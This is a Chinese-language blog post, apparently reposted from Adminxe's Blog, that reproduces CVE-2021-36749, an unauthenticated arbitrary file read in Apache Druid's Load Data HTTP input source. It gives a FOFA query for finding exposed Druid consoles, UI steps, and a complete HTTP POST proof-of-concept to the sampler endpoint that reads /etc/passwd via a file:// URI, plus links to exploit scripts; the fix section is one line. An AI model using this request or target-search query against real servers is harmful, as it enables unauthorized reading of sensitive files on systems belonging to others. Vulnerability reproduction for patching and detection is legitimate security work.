# 【漏洞复现】CVE-2021-36749 Apache Druid LoadData 任意文件读取漏洞 - Adminxe - 博客园

> 原文：[`www.cnblogs.com/cn-gov/p/15572281.html`](https://www.cnblogs.com/cn-gov/p/15572281.html)

![](img/fa2c2a8569f8cbcd33305eee26f770e8.png)

### 0x00 漏洞详情

由于用户指定 HTTP InputSource 没有做出限制，可以通过将文件 URL 传递给 HTTP
InputSource 来绕过应用程序级别的限制。攻击者可利用该漏洞在未授权情况下，构造恶意请求执行文件读取，最终造成服务器敏感性信息泄露。

### 0x01 fofa 语法

```
title="Apache Druid"
```

![](img/fe4ba3e75277e13bf554fb3085848b5a.png)

### 0x02 漏洞复现

主界面–>Load data –>HTTP(s)–>Connect Data–>URIs(使用 file://协议进行读取)

![](img/bfc4f8a247411f05f027e26c7fa93854.png)![](img/353c99da3ba7771fd578a57fb8fa0cee.png)![](img/799efa3bce7b4b4647ffedafcec5ae31.png)![](img/2f3d70863339531328c1ccbf26d9f17c.png)

```
file:///etc/passwd
```

![](img/e0f695fdbd400cc9abc3ff1cf8e01272.png)

POC:

```
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: 127.0.0.1:8888
Content-Length: 413
Accept: application/json, text/plain, */*
Origin: http://127.0.0.1:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0
Content-Type: application/json;charset=UTF-8
Referer: http://127.0.0.1:8888/unified-console.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":["file:///etc/passwd"]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
```

![](img/bef8b4a1b14fb7a7543ce8b68352197e.png)

### 0x03 利用脚本

*   https://github.com/BrucessKING/CVE-2021-36749/blob/main/CVE-2021-36749.py
*   https://github.com/dorkerdevil/CVE-2021-36749/blob/main/CVE-2021-36749.py

### 0x04 修复方法

升级版本，设置访问权限

转载请注明：[Adminxe's Blog](https://www.adminxe.com/) » [【漏洞复现】CVE-2021-36749 Apache Druid LoadData 任意文件读取漏洞](https://www.adminxe.com/3046.html)